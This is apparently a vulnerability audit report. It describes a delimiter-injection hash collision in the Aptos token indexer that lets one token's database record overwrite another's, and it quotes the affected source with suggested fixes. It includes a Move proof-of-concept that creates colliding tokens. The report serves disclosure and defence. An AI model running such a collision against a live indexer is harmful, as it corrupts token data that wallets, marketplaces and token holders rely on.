# Audit Report

## Title
Hash Collision via Delimiter Injection in Token Indexer Causing Permanent Data Loss

## Summary
The Aptos indexer's token data hashing mechanism uses an unescaped delimiter (`::`) when serializing `TokenDataId` structs to strings before computing SHA-256 hashes. This allows attackers to create distinct tokens on-chain that produce identical hashes in the indexer, causing permanent data loss when the second token's data overwrites the first in the `current_token_datas` database table.

## Finding Description
The vulnerability exists in the token identifier hashing logic used by the indexer. When a `TokenDataId` is converted to a hash for database storage, it follows this path:

1. `TokenDataId` struct contains three fields: `creator` (address), `collection` (String), and `name` (String) [1](#0-0) 

2. The indexer serializes this struct using the `Display` trait implementation, which concatenates the fields with `::` delimiter without escaping: [2](#0-1) 

3. The resulting string is hashed using SHA-256: [3](#0-2) 

4. The hash is used as the **sole primary key** in the `current_token_datas` table: [4](#0-3) 

The on-chain token contract performs NO validation to prevent `::` characters from appearing in collection or name strings, only checking length constraints: [5](#0-4) 

**Attack Scenario:**
An attacker creates two tokens with the same creator address:
- Token A: `{ creator: "0x1", collection: "MyCollection", name: "Token::Name" }`
  → Serializes to: `"0x0000...0001::MyCollection::Token::Name"`
  → Hash: `sha256("0x0000...0001::MyCollection::Token::Name")`

- Token B: `{ creator: "0x1", collection: "MyCollection::Token", name: "Name" }`
  → Serializes to: `"0x0000...0001::MyCollection::Token::Name"`
  → Hash: `sha256("0x0000...0001::MyCollection::Token::Name")` ← **IDENTICAL**

On-chain, these are stored as separate entries because the blockchain uses the full `TokenDataId` struct as the key: [6](#0-5) 

However, in the indexer, when Token B is processed, the upsert operation overwrites Token A's data: [7](#0-6) 

The WHERE clause only checks transaction version, not token identity, so if Token B has a higher or equal transaction version, it completely replaces Token A's record. Token A becomes permanently invisible to any application querying the indexer.

## Impact Explanation
This vulnerability qualifies as **Medium Severity** under the "State inconsistencies requiring intervention" category. 

**Impact:**
- Permanent data loss in the indexer for the overwritten token
- Applications relying on the indexer (wallets, marketplaces, explorers) will display incorrect or missing token metadata
- Token holders of the overwritten token cannot see their token information via indexer APIs
- The blockchain state remains correct, but off-chain infrastructure is compromised
- Manual database intervention is required to detect and fix affected records
- No direct fund loss, but token visibility and marketability are severely impacted

The database schema confirms only the hash is used as the primary key: [8](#0-7) 

## Likelihood Explanation
**Likelihood: High**

This attack is trivial to execute:
1. Any user can create tokens on-chain by calling the public `create_tokendata` function [9](#0-8) 

2. No special permissions or stake required
3. Attacker only needs to craft collection or name fields containing `::` characters
4. The attack is deterministic and repeatable
5. Detection is difficult without comparing indexer data against full blockchain state
6. Multiple tokens can be targeted simultaneously

The only barrier is that the attacker must use their own creator address, so they cannot directly attack existing tokens from other creators. However, they can:
- Create "decoy" tokens that shadow legitimate tokens in search results
- Cause confusion in marketplaces showing token collections
- Execute griefing attacks by creating and destroying hash-colliding tokens

## Recommendation
**Fix Option 1: Use Composite Primary Key**
Modify the database schema to use `(creator_address, collection_name, name)` as the primary key instead of just the hash. This matches the on-chain uniqueness constraint.

**Fix Option 2: Escape Delimiters**
Modify the `Display` implementation to escape `::` sequences in collection and name fields before serialization:

```rust
impl fmt::Display for TokenDataIdType {
    fn fmt(&self, f: &mut Formatter) -> std::fmt::Result {
        write!(
            f,
            "{}::{}::{}",
            standardize_address(self.creator.as_str()),
            self.collection.replace("::", "\\::\\:"),
            self.name.replace("::", "\\::\\:")
        )
    }
}
```

**Fix Option 3: Add Unique Constraint**
Keep the hash as primary key for performance, but add a unique constraint on `(creator_address, collection_name, name)` to detect collisions:

```sql
ALTER TABLE current_token_datas 
ADD CONSTRAINT unique_token_identity 
UNIQUE (creator_address, collection_name, name);
```

**Recommended Approach:** Use Fix Option 1 (composite primary key) as it provides the strongest guarantee and matches the on-chain model exactly.

## Proof of Concept

```move
// File: collision_poc.move
module attacker::collision_poc {
    use aptos_token::token;
    use std::string;
    use std::signer;

    public entry fun create_colliding_tokens(creator: &signer) {
        // First, create a collection
        token::create_collection(
            creator,
            string::utf8(b"Test Collection"),
            string::utf8(b"A test collection"),
            string::utf8(b"https://example.com"),
            0, // no max
            vector[false, false, false]
        );

        // Create Token A with delimiter in name
        token::create_tokendata(
            creator,
            string::utf8(b"Test Collection"),
            string::utf8(b"Token::Part2"), // Name contains ::
            string::utf8(b"First token"),
            0, // no max
            string::utf8(b"https://example.com/token1"),
            @0x1,
            100,
            100,
            token::create_token_mutability_config(&vector[false, false, false, false, false]),
            vector[],
            vector[],
            vector[]
        );

        // Create Token B with delimiter in collection via second collection
        token::create_collection(
            creator,
            string::utf8(b"Test Collection::Token"),
            string::utf8(b"A second collection"),
            string::utf8(b"https://example.com"),
            0,
            vector[false, false, false]
        );

        token::create_tokendata(
            creator,
            string::utf8(b"Test Collection::Token"), // Collection contains original + ::
            string::utf8(b"Part2"), // Name completes the pattern
            string::utf8(b"Second token - will overwrite first in indexer"),
            0,
            string::utf8(b"https://example.com/token2"),
            @0x1,
            100,
            100,
            token::create_token_mutability_config(&vector[false, false, false, false, false]),
            vector[],
            vector[],
            vector[]
        );

        // Both tokens now exist on-chain with different TokenDataIds
        // But in the indexer, they hash to the same value:
        // sha256("{creator}::Test Collection::Token::Part2")
        // The second token's data will overwrite the first in current_token_datas table
    }
}
```

**Verification Steps:**
1. Deploy and execute the PoC on Aptos testnet
2. Query the blockchain state directly - both tokens exist
3. Query the indexer API - only Token B is visible, Token A is permanently lost
4. Check `current_token_datas` table - only one row exists with Token B's data

## Notes
This vulnerability demonstrates a **delimiter injection attack** where unescaped separators in serialization allow distinct structured data to produce identical serialized representations. While the attack doesn't compromise blockchain consensus or on-chain funds, it causes permanent data corruption in critical infrastructure that applications depend on for token metadata and ownership queries.

### Citations

**File:** aptos-move/framework/aptos-token/sources/token.move (L177-184)
```text
    struct TokenDataId has copy, drop, store {
        /// The address of the creator, eg: 0xcafe
        creator: address,
        /// The name of collection; this is unique under the same account, eg: "Aptos Animal Collection"
        collection: String,
        /// The name of the token; this is the same as the name field of TokenData
        name: String,
    }
```

**File:** aptos-move/framework/aptos-token/sources/token.move (L253-259)
```text
    struct Collections has key {
        collection_data: Table<String, CollectionData>,
        token_data: Table<TokenDataId, TokenData>,
        create_collection_events: EventHandle<CreateCollectionEvent>,
        create_token_data_events: EventHandle<CreateTokenDataEvent>,
        mint_token_events: EventHandle<MintTokenEvent>,
    }
```

**File:** aptos-move/framework/aptos-token/sources/token.move (L1249-1263)
```text
    public fun create_tokendata(
        account: &signer,
        collection: String,
        name: String,
        description: String,
        maximum: u64,
        uri: String,
        royalty_payee_address: address,
        royalty_points_denominator: u64,
        royalty_points_numerator: u64,
        token_mutate_config: TokenMutabilityConfig,
        property_keys: vector<String>,
        property_values: vector<vector<u8>>,
        property_types: vector<String>
    ): TokenDataId acquires Collections {
```

**File:** aptos-move/framework/aptos-token/sources/token.move (L1264-1266)
```text
        assert!(name.length() <= MAX_NFT_NAME_LENGTH, error::invalid_argument(ENFT_NAME_TOO_LONG));
        assert!(collection.length() <= MAX_COLLECTION_NAME_LENGTH, error::invalid_argument(ECOLLECTION_NAME_TOO_LONG));
        assert!(uri.length() <= MAX_URI_LENGTH, error::invalid_argument(EURI_TOO_LONG));
```

**File:** crates/indexer/src/models/token_models/token_utils.rs (L67-77)
```rust
impl fmt::Display for TokenDataIdType {
    fn fmt(&self, f: &mut Formatter) -> std::fmt::Result {
        write!(
            f,
            "{}::{}::{}",
            standardize_address(self.creator.as_str()),
            self.collection,
            self.name
        )
    }
}
```

**File:** crates/indexer/src/util.rs (L19-21)
```rust
pub fn hash_str(val: &str) -> String {
    hex::encode(sha2::Sha256::digest(val.as_bytes()))
}
```

**File:** crates/indexer/src/models/token_models/token_datas.rs (L45-48)
```rust
#[derive(Debug, Deserialize, FieldCount, Identifiable, Insertable, Serialize)]
#[diesel(primary_key(token_data_id_hash))]
#[diesel(table_name = current_token_datas)]
pub struct CurrentTokenData {
```

**File:** crates/indexer/src/processors/token_processor.rs (L412-453)
```rust
fn insert_current_token_datas(
    conn: &mut PgConnection,
    items_to_insert: &[CurrentTokenData],
) -> Result<(), diesel::result::Error> {
    use schema::current_token_datas::dsl::*;

    let chunks = get_chunks(items_to_insert.len(), CurrentTokenData::field_count());

    for (start_ind, end_ind) in chunks {
        execute_with_better_error(
            conn,
            diesel::insert_into(schema::current_token_datas::table)
                .values(&items_to_insert[start_ind..end_ind])
                .on_conflict(token_data_id_hash)
                .do_update()
                .set((
                    creator_address.eq(excluded(creator_address)),
                    collection_name.eq(excluded(collection_name)),
                    name.eq(excluded(name)),
                    maximum.eq(excluded(maximum)),
                    supply.eq(excluded(supply)),
                    largest_property_version.eq(excluded(largest_property_version)),
                    metadata_uri.eq(excluded(metadata_uri)),
                    payee_address.eq(excluded(payee_address)),
                    royalty_points_numerator.eq(excluded(royalty_points_numerator)),
                    royalty_points_denominator.eq(excluded(royalty_points_denominator)),
                    maximum_mutable.eq(excluded(maximum_mutable)),
                    uri_mutable.eq(excluded(uri_mutable)),
                    description_mutable.eq(excluded(description_mutable)),
                    properties_mutable.eq(excluded(properties_mutable)),
                    royalty_mutable.eq(excluded(royalty_mutable)),
                    default_properties.eq(excluded(default_properties)),
                    last_transaction_version.eq(excluded(last_transaction_version)),
                    collection_data_id_hash.eq(excluded(collection_data_id_hash)),
                    description.eq(excluded(description)),
                    inserted_at.eq(excluded(inserted_at)),
                )),
            Some(" WHERE current_token_datas.last_transaction_version <= excluded.last_transaction_version "),
        )?;
    }
    Ok(())
}
```

**File:** crates/indexer/migrations/2022-09-20-055651_add_current_token_data/up.sql (L26-28)
```sql
CREATE TABLE current_token_datas (
  -- sha256 of creator + collection_name + name
  token_data_id_hash VARCHAR(64) UNIQUE PRIMARY KEY NOT NULL,
```
